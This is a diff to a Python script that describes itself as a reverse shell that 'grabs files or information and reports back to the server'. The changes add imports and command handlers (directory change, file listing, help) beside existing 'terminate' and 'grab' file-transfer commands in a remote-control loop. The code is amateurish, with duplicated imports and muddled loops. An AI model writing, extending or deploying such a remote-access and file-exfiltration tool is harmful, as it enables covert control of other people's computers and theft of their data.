@@ -3,6 +3,13 @@
 import socket
 import os
 import time
+import socket
+import subprocess
+import os
+import sys
+import readline
+import commands
+import platform
 
 
 """This is python reverse shell that grabs files or information and reports back to the server!"""
@@ -93,6 +100,36 @@ def connect():
                 conn.send('terminate')
                 conn.close() #close the connection with host
                 break
+
+            elif "help" in command:
+                for x in command:
+                    x = "help"
+                    print("[+] here is the help ")
+                    menu()
+                    break
+
+            elif 'cd' in command:
+                for x in command:
+                    if 'cd*' in x:
+                        code, command = command.split("*")
+                        os.chdir(command)
+                        print ("[+] CWD Is " + os.getcwd())
+
+                    elif 'cd' in command:
+                        code, command = command.split(" ")
+                        os.chdir(command)
+                        print ("[+] CWD Is " + os.getcwd())
+
+            elif 'ls' in command:
+                dirlist = os.listdir(".")
+                print(dirlist)
+
+            #elif 'getenv' in command:
+            #    s.send( "[+] Platform Is " + platform.platform())
+
+            #elif 'getuid' in command:
+            #    s.send( "[+] UserID Is " + os.environ.get('USERNAME'))
+
             elif 'grab' in command:
                 transfer(conn,command)  #usage shell > grab*file
 
